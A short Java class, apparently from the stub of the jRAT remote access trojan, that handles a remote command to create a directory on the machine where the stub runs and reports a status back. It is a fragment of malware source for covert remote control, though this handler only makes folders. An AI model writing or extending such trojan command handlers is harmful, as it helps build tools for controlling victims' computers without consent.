package pro.jrat.stub.packets.incoming;

import java.io.File;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Constants;



public class Packet43CreateDirectory extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String where = Connection.readLine();
		String name = Connection.readLine();
		
		File file = new File(where + File.separator + name);
		file.mkdirs();
		Connection.status(Constants.STATUS_MKDIR);
	}

}
